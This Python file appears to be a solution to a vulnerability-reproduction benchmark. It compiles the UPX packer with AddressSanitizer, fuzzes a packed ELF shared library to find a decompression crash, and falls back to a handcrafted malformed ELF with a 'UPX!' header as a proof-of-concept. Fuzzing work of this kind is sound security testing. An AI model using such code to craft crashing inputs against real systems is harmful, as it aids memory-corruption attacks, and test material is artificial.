import os
import sys
import subprocess
import shutil
import tarfile
import random
import time
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Configuration
        compile_timeout = 180
        fuzz_timeout = 45
        
        base_dir = os.path.abspath("/tmp/work_upx_exploit")
        if os.path.exists(base_dir):
            shutil.rmtree(base_dir)
        os.makedirs(base_dir)
        
        # 1. Extract Source
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=base_dir)
        except Exception:
            return self.fallback_poc()

        # Find Makefile location
        src_root = None
        for root, dirs, files in os.walk(base_dir):
            if "Makefile" in files:
                # Prefer src directory if it exists as a subdir to ensure correct build root
                if os.path.basename(root) == 'src' or 'src' in dirs:
                    src_root = root
                    break
        if not src_root:
            for root, dirs, files in os.walk(base_dir):
                if "Makefile" in files:
                    src_root = root
                    break
                    
        if not src_root:
            return self.fallback_poc()

        # 2. Compile with ASAN
        env = os.environ.copy()
        flags = "-fsanitize=address -g"
        env["CFLAGS"] = flags
        env["CXXFLAGS"] = flags
        env["LDFLAGS"] = flags
        env["CC"] = "gcc"
        env["CXX"] = "g++"
        
        upx_bin = None
        try:
            # Build UPX
            subprocess.run(["make", "-j8"], cwd=src_root, env=env, 
                           timeout=compile_timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Locate binary
            candidates = []
            for root, dirs, files in os.walk(base_dir):
                if "upx.out" in files:
                    candidates.append(os.path.join(root, "upx.out"))
                if "upx" in files:
                    p = os.path.join(root, "upx")
                    if os.access(p, os.X_OK):
                        candidates.append(p)
            
            # Prefer src/upx.out
            for c in candidates:
                if "src/upx.out" in c:
                    upx_bin = c
                    break
            if not upx_bin and candidates:
                upx_bin = candidates[0]
                
        except Exception:
            pass
            
        if not upx_bin:
            return self.fallback_poc()

        # 3. Create Seed (Packed ELF)
        dummy_c = os.path.join(base_dir, "dummy.c")
        dummy_so = os.path.join(base_dir, "dummy.so")
        packed_file = os.path.join(base_dir, "packed.upx")
        
        # Create a valid shared library large enough for UPX
        with open(dummy_c, "w") as f:
            f.write("int data[10000]; void entry(){}")
            
        try:
            subprocess.run(["gcc", "-shared", "-fPIC", "-o", dummy_so, dummy_c], 
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Pack it using the compiled binary
            # Use --no-lzma to speed up and reduce dependencies
            subprocess.run([upx_bin, "-f", "--no-lzma", "-o", packed_file, dummy_so],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
        except Exception:
            pass

        seed_data = b""
        if os.path.exists(packed_file):
            with open(packed_file, "rb") as f:
                seed_data = f.read()
        else:
            seed_data = self.fallback_poc()

        # 4. Fuzz
        start_time = time.time()
        best_crash = None
        
        # Check initial seed
        if self.check_crash(upx_bin, seed_data):
            return seed_data
            
        while time.time() - start_time < fuzz_timeout:
            mutated = bytearray(seed_data)
            
            # Mutation
            mutation_type = random.random()
            if mutation_type < 0.6:
                # Bit flips
                for _ in range(random.randint(1, 10)):
                    idx = random.randint(0, len(mutated)-1)
                    mutated[idx] ^= (1 << random.randint(0, 7))
            elif mutation_type < 0.9:
                # Byte overwrite
                for _ in range(random.randint(1, 5)):
                    idx = random.randint(0, len(mutated)-1)
                    mutated[idx] = random.randint(0, 255)
            else:
                # Magic values (DT_INIT related: 0x0C)
                for _ in range(random.randint(1, 3)):
                    idx = random.randint(0, len(mutated)-4)
                    mutated[idx] = 0x0C 
            
            if self.check_crash(upx_bin, mutated):
                best_crash = bytes(mutated)
                break
                
        if best_crash:
            # Minimize by truncation
            min_crash = best_crash
            while len(min_crash) > 512:
                cut_len = (len(min_crash) - 512) // 2
                if cut_len < 1: cut_len = 1
                candidate = min_crash[:-cut_len]
                
                if self.check_crash(upx_bin, candidate):
                    min_crash = candidate
                else:
                    if cut_len == 1:
                        break
                    break
            
            # Try forcing to 512
            if len(min_crash) > 512:
                candidate = min_crash[:512]
                if self.check_crash(upx_bin, candidate):
                    return candidate
            
            return min_crash
            
        return seed_data

    def check_crash(self, binary, data):
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(data)
            tf_name = tf.name
        
        crashed = False
        try:
            # Check for crash during decompression
            # -d: decompress, -f: force overwrite, -o /dev/null: discard output
            proc = subprocess.run([binary, "-d", "-f", "-o", "/dev/null", tf_name], 
                                  stdout=subprocess.DEVNULL, 
                                  stderr=subprocess.PIPE, 
                                  timeout=0.5)
            if proc.returncode != 0:
                err = proc.stderr.decode(errors='ignore')
                # Look for ASAN signature
                if "AddressSanitizer" in err:
                    crashed = True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        finally:
            if os.path.exists(tf_name):
                os.unlink(tf_name)
        return crashed

    def fallback_poc(self) -> bytes:
        # Minimal ELF header with UPX signature injection
        # ELF64 Header
        elf_header = b'\x7fELF\x02\x01\x01\x00' + (b'\x00' * 8)
        # Type ET_DYN (3), Machine X86_64 (62)
        elf_header += struct.pack('<HHIQQQIHHHHHH', 3, 62, 1, 0, 64, 0, 0, 64, 56, 1, 64, 0, 0)
        
        # PT_LOAD
        phdr = struct.pack('<IIQQQQQQ', 1, 7, 0, 0, 0, 512, 512, 0x1000)
        
        payload = bytearray(512 - len(elf_header) - len(phdr))
        # Add UPX! magic
        idx = 100
        payload[idx:idx+4] = b'UPX!'
        # PackHeader values (version 13, method 2)
        payload[idx+4] = 13
        payload[idx+6] = 2
        
        return elf_header + phdr + bytes(payload)
